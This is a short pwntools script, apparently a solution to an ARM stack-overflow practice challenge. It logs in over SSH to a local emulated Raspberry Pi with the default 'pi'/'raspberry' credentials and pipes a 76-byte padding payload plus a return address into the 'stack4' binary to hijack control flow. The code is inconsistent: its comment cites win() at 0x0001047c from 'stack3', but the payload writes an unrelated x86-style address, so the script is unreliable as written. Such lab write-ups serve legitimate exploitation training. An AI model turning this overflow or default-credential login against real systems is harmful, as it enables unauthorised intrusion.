#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='localhost', user='pi', password='raspberry', port=5022)
# overflowing the buffer modifies the stack
# win() is at address 0001047c <win>: from objdump -d stack3
exploit = b'python -c \'print "a"*76+"\\xf4\\x83\\x04\\x08"\' |~/binary-exploitation-solution-scripts/azeriaARMchallenges/stack4'
sh = s.shell('bash')
sh.sendline(exploit)
for i in range(2):
    print(sh.recvline())
log.info(sh.recvline().decode('utf-8'))
s.close()